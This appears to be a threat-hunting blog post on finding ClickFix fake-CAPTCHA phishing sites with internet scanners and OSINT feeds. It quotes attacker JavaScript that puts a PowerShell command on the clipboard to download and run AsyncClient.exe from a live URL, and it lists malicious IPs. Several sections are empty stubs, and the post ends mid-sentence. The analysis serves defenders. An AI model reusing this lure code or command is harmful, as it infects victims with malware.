---
title: ENG - OSINT Study Case | Hunting ClickFix Social Engineering Website
date: 2025-02-11
author: khuong
layout: post
categories: [Security]
tags: [investigation, osint,ttp]   
toc: true
image:
  path: /assets/img/warhammer_paper_sigma.jpg
---


## Overview

From reading a bunch of TI reports & news related to phishing & social engineering, there is somewhat new phishing technique in 2024 - 2025, which is ClickFix. I've done a blog post about Telegram Impersonate or you could
say [How to find impersonate website](https://0xdefh.github.io/posts/OSINT-TTP-How-to-find-impersonate-website/).

In that blog, I show how to track or find a impersonate website using pivoting from various thing from the legit website & and some HTML content, javascript, and UIL. In this blog, from those core concept we will applied it for
different case. 

`I hope you feel inspired by the ideas and techniques to start hunting on your own, just as I have drawn inspiration from those who came before me`

## Undertand What is ClickFix/ClearFake

Proofpoint researchers, who coined the term ClickFix for this tactic, reported that the initial access broker TA571 had been using it in phishing campaigns since March 2024. The scheme involved tricking users into copying and executing a command under the pretense of resolving an issue.

In practice, the TA would send an email or attachment that, when opened, triggered a fake error message—often designed to resemble a familiar file type—prompting the user to follow the provided instructions. But that was just the beginning.

A year later, ClickFix has certainly evolved. However, in my view, it has merely recycled existing techniques, experimenting with different legitimate services that were already available.



**By the end of 2024**, The term **DeceptionAds** was a thing, which (you can read it right [here](https://labs.guard.io/deceptionads-fake-captcha-driving-infostealer-infections-and-a-glimpse-to-the-dark-side-of-0c516f4dc0b6)) was a Ad-Networks As Enablers to `cloak` their intention
and use it to spread the Malware



### Ads-Networks 

Threat Actor leverage these ads-network in order to maximize their infection, most of the others techniques also use it

This is how the ads-network suppose to work or it work in general

![Ads-Network](/assets/img/Ad-networks.png)

From the above picture you can see that it is leverage a proxy which will deliver ads to user based on the Browser Fingerprint 

## Hunting for ClickFix/ ClearFake Website 

### Specific tool used

For this type of job I'll used tool & information that related to URL, Domain, and mostly Scanner Database (because it will have all the HTML content that you can search on) these tool & and data sources are:

- [Validin](https://www.validin.com/)
- [URLScan.io](https://urlscan.io/)
- [AnyRun](https://any.run/)
- [Censys](https://censys.com/)
- [Shodan](https://www.shodan.io/)
- [ZoomEye](https://www.zoomeye.ai/)
- [Fofa](https://en.fofa.info/)

### Obtain intial lead or seed information - Collection

I’m not sure why, but when it comes to the collection phase, I always get goosebumps. It’s the stage where I consistently learn something new, take notes, and track that knowledge. It’s a thrill whether it's discovery or rediscovery and I absolutely love it.

So, let’s dive into the collection phase, where we gather information from various sources. For this, I want to highlight one of my favorite platforms: X (formerly Twitter). It’s a hub of talented individuals sharing valuable information and intelligence on social media.

#### Social Media, Webistes, Forum, ... (I used X for example)

Here are the list of X / Twitter Account that publish and sharing information & intelligence: 

- [Lontz - Threat Intelligence Researcher](https://x.com/lontze7)
- [@skocherhan - Provide information & intelligence on Phishing page](https://x.com/skocherhan)
- [Gen Threat Labs](https://x.com/GenThreatLabs)

From these X / Twitter account I advise you to follow even more accounts. Those are just some example account.

Or you can searach on Twitter on these hashtag: **#ClickFix**, **#FakeCapcha**, and **#ClearFake**, from these information you gain for these you will conduct to use to pivoting even more.

Here are some example about the information that present on these accounts

![Example X Information](/assets/img/example_x_intel.png)


> Early 2021, I'm still be able to use Twitter APIs to crawl these tweet and aggregated it into my system for everyday triage & verify -> analyze, but since Twitter decided the API shouldn't free any more. The tools I used just die out, I haven't had the time 
> to look in to it, probably 2025 will be the year I start to bring back those tool. If you curios what's tool I used today, I use [MISP](https://www.misp-project.org/) 
{: .prompt-info }

#### MISP 

I do use MISP in order to have a bunch of information that reported by others security folk or intelligence agencies, these information really help me to gain pivoting point,
These information ingested from multile data feed such as: Threat Fox, URLHaus, and other different sources -> so I don't have to use each of those API to ingest manually myself

Here are some of my queries that I use to extract information for every day triage and analyzed.


#### Others

There still a lot of data sources that you can collect, others social media platform such as Tiktok, Instagram, Facebook and other forum that I haven't listed here

Or you could just take a look that the most used website and then start picking any UIL and part of it and search on various platform to check are there any infomation.


> As you can see, data collection is a meticulous process that requires significant effort. The scope and quality of the information gathered depend on the context, customer requirements, or personal objectives. While I have yet to master the art of collection, I continue to refine my skills and improve.
{: .prompt-info } 

### Start Pivoting & Investigate 

After a long Collection phase, you are ready to start investigate. The time of this Study Case is **24/02/2025** which all the data & the step that I took during this Study Case could
be alter because of the site is down, we will start with 2 separate study case

- With intial information
- Wihtout intial information

> I don't have access to robust tool, so I will try to be resourceful as possible and leverage free tools & free source of data.
{: .prompt-info }

#### With Intial Information

- Domain: 
- HTML Content: 
- Javascript Content: 

#### Without Intial Information

Without intial information & and the limiation of resource such has robust tools, we will do this in old fashion way. Let's research some of the most used website in the Internet and the core concept of ClickFix

Which is using **copy-paste to clipboard script and make user to paste it to their CMD or Powershell command line**.


**Copy-Paste Clipboard**

From other vendors and the report that I've read these keyword usually used on the Copy-Paste notification or pop-up that request user to copy the script. So let's hunt for that indidcator or UIL.

Here are some picture related these type of pop-up, which I found on Twitter and other intelligence report from [Germán Fernández's Tweet](https://x.com/1ZRR4H/status/1897023643668062243)

![Copy-Paste Click Fix 1](/assets/img/clickfix_copy_paste1.jpeg)

And from [ܛܔܔܔܛܔܛܔܛ's Tweet](https://x.com/skocherhan/status/1889754939859009917)

![Copy-Paste Click Fix 2](/assets/img/clickfix_copy_paste2.png)

Or from [Lumma Stealer ClickFix](https://www.silentpush.com/blog/lumma-stealer/)

![Lumma Stealer ClickFix](/assets/img/clickfix_copypaste_lumma.png)

These Copy-Paste has
* The **embeded a javascript contain a powershell script** 
* The **Control (CTRL) + C** and **Control (CTRL) + V** 
* The **Press Windows Button** or **Windows + R** which quite a UIL in my opinion.
* The **Robot or Human** or **I'm not a robot**

Let's use Internet Scanner tools for these type of search, let's search for the HTML content 

```shell
services.http.response.body: "Windows + R" or "Verification Steps" or "CTRL + V" or "Ctrl + V" or "Windows Key" and "powershell"
```
Or you can search each of the term one by one in order to have more granular information

We found a server that has: 
* IP Address: **66.248.206.135**
* Query: **services.http.response.body: "Windows + R"** 




We also found another server: 

* IP Address: **196.251.113.41**
* HTML Title / Banner: **reCAPTCHA Verification**
* Port Sequence: 80, 135, ,139, 443, 445, 3306, 5985, 47001 
* Query: **(services.http.response.body:"Verification Steps") and services.port=`443`**
* Host: `https://search.censys.io/hosts/196.251.113.41`

Example Screenshot: 

![ClickFix Check Robot](/assets/img/clickfix_check_robot.png)

![ClickFix ReCaptcha](/assets/img/clickfix_server_recaptcha.png)

![ClickFix Powershell Script](/assets/img/clickfix_server_ps_script.png)

```javascript
        document.getElementById("checkbox").addEventListener("click", function() {
            let verifyWindow = document.getElementById("verify-window");
            verifyWindow.classList.add("show");
            generateRandomID();
        });

        function generateRandomID() {
            let randomID = Math.floor(100000 + Math.random() * 900000);
            document.getElementById("verification-id").innerText = randomID;
            copyPayload(randomID);
        }

        function copyPayload(id) {
            const payload = `powershell -Command Invoke-WebRequest -Uri 'https://2ur.jp/NJgY' -OutFile $env:USERPROFILE\\AsyncClient.exe; Start-Process -FilePath $env:USERPROFILE\\AsyncClient.exe -Wait # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${id}''`;
            navigator.clipboard.writeText(payload).then(() => {
                console.log("Payload copied to clipboard with ID:", id);
            }).catch(err => {
                console.error("Clipboard copy failed: ", err);
            });
        }    
```

We found another domain: **hxxps://2ur[.]jp/NJgY** which will download a **AsycnClient.exe**, We will use URLScan.io to scan this domain you can access this link [https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions](https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions)

Which it will redirect to **hxxps://196.251.113[.]41/AsyncClient.exe** with the file hash 284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76 and if you ever to search the hash on the VirusTotal (VT) -> ALL RED VT Link: [https://www.virustotal.com/gui/file/284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76](https://www.virustotal.com/gui/file/284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76)




**Captcha Page**

Fake-Captcha page also their main thing to fake and deliver their malware, as you can see from the above example 

**Google Related Pages**



**Microsoft Related Pages**




### Take Action upon it 

From my perspective, how would I take action against it based on the context that:

- Who am I?
- What am I capable of?
- When do I want to take action/
- Where do I want to take these action?
- How long does it take for these action to come in to play?

From the above question I could do such things, that I know it's gonna work fast and give result, I do know that I could report to vendors or platfrom that incharge of these thing, if the response time is faster.


#### Post on X with the proper hashtag

I think this is the simplest action you can take, just post your finding with some picture to the Twitter and with the proper tag you could probably help a bunch of people,

#### Report it to intelligence  opensource platform 

Use can publish your finding on these plaform, and tag them as such: 

- URLHaus
- ThreatFox
- URLScan.io

-> By doing this you help the intelligence commmunity to fight against the TA.

#### Publish on MISP (If you could) 

By having an account on MISP you can publish your finding on


## Conclusion & Biaes

I know this was a lengthy article, and I hope it provided valuable insights to support you on your journey to conducting hunts independently. My inspiration came largely from the blogs of Sekoia and Group-IB. Also not
to mention folks that are sharing information and intelligence for free on Social Media / Blogs Platform.

My conclusion and perspective on these type of phishing is that, if only one momment that you careless and paste something on your computer without prior checking then 
changes are you getting hacked will be very high, we are living in a fast world and a lot of information floating around, by verify all of the information you come arcoss will take
a bunch of time.

TA know this and exploit evevy corner of it. By hunting and reported these type of phishing -> we only contribute a small little effort into slowing them down (I mean you can't absolute stoping any evil and bad thing tbh)

Honestly, Hunting is just like a quest fo

### Bias

Also these thing doesn't actually work everytime, there infrastructure change and they will use CDN such as CloudFlare & Akamai and other thing to
hide their infra from detection such as URLScan, Google Dork, generally internet scanner

## Refs

* [Sekoia - ClickFix Tactic The Phantom Meet](https://blog.sekoia.io/clickfix-tactic-the-phantom-meet/)
* [SilentPush - ClickFix](https://www.silentpush.com/blog/clickfix/)
* [Proofpoint - Clipboard Compromised Powershell Self Pwn](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn)
* [Esentire - Lumma Stealer ClickFix Distritubtion](https://www.esentire.com/security-advisories/lumma-stealer-clickfix-distribution)
* [MalwareBytes - ClickFix vs Traditional Download in New DarkGate Campaign](https://www.malwarebytes.com/blog/news/2025/01/clickfix-vs-traditional-download-in-new-darkgate-campaign)
* [HHS - ClickFix Attacks Sector Alert TLP CLEAR](https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf)
* [McAfee Labs - ClickFix Deception a Social Engineering Tactic to Deploy Malware](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clickfix-deception-a-social-engineering-tactic-to-deploy-malware/)
* [Criminal IP - ClickFix Fake Error Messags](https://blog.criminalip.io/2024/10/07/clickfix-fake-error-messages/)
* [Malicious Ads Push Lumma Information Stealer via Fake Captcha Pages](https://www.bleepingcomputer.com/news/security/malicious-ads-push-lumma-infostealer-via-fake-captcha-pages/)
* [DeceptionAds - Fake Captcha](https://labs.guard.io/deceptionads-fake-captcha-driving-infostealer-infections-and-a-glimpse-to-the-dark-side-of-0c516f4dc0b6)
* [Recorded Future - 2024 Malicious Infrastucture Report](https://www.recordedfuture.com/research/2024-malicious-infrastructure-report) (You should read the whole report)